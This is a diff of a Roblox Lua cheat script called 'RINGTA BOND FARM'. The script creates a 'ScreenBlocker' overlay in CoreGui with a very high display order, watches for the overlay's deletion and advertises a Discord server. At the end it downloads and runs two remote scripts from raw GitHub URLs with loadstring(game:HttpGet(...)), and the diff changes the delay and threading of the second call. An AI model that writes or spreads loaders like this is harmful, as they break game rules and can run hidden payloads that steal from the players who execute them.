@@ -8,6 +8,7 @@ local StatusLabel = Instance.new("TextLabel")
 local CreditsLabel = Instance.new("TextLabel")
 local BondsLabel = Instance.new("TextLabel") -- ✅ Fixed missing BondsLabel
 
+
 -- ScreenGui Settings
 ScreenGui.Name = "ScreenBlocker"
 ScreenGui.DisplayOrder = 999999999
@@ -16,17 +17,17 @@ ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = game:GetService("CoreGui")
 
--- Main Frame
+-- Main Frame (70% of screen, centered)
 Frame.Name = "MainFrame"
-Frame.Size = UDim2.new(1, 0, 1, 0)
-Frame.Position = UDim2.new(0, 0, 0, 0)
+Frame.Size = UDim2.new(0.7, 0, 0.7, 0) 
+Frame.Position = UDim2.new(0.15, 0, 0.15, 0) 
 Frame.BackgroundTransparency = 0
 Frame.Parent = ScreenGui
 
 -- Black and White Gradient Background
 UIGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),  -- Black
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))  -- White
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), 
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)) 
 })
 UIGradient.Rotation = 45
 UIGradient.Parent = Frame
@@ -40,7 +41,7 @@ TitleLabel.Name = "Title"
 TitleLabel.Parent = Frame
 TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
 TitleLabel.Size = UDim2.new(0.8, 0, 0.15, 0)
-TitleLabel.Position = UDim2.new(0.5, 0, 0.2, 0)
+TitleLabel.Position = UDim2.new(0.5, 0, 0.15, 0) -- Slightly moved higher
 TitleLabel.BackgroundTransparency = 1
 TitleLabel.Text = "RINGTA BOND FARM"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -50,12 +51,12 @@ TitleLabel.TextStrokeTransparency = 0.7
 TitleLabel.TextStrokeColor3 = Color3.fromRGB(100, 100, 100)
 TitleLabel.ZIndex = 2
 
--- Discord Label
+-- Discord Label (Newly Added)
 DiscordLabel.Name = "Discord"
 DiscordLabel.Parent = Frame
 DiscordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
 DiscordLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
-DiscordLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+DiscordLabel.Position = UDim2.new(0.5, 0, 0.35, 0) -- Positioned under the title
 DiscordLabel.BackgroundTransparency = 1
 DiscordLabel.Text = "discord.gg/ringta"
 DiscordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -63,6 +64,7 @@ DiscordLabel.TextScaled = true
 DiscordLabel.Font = Enum.Font.GothamMedium
 DiscordLabel.TextStrokeTransparency = 0.8
 DiscordLabel.ZIndex = 2
+
 
 -- Status Label
 StatusLabel.Name = "Status"
@@ -163,5 +165,7 @@ watchForDeletion(ScreenGui)
 -- ✅ **Auto-execute the loadstring immediately**
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/queue.github.io/refs/heads/main/queue.lua"))()
 
-task.wait(5) -- Waits for 0.5 seconds
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/nwhir.github.io/refs/heads/main/erj.lua"))()
+task.spawn(function()
+    task.wait(7) 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/nwhir.github.io/refs/heads/main/erj.lua"))()
+end)
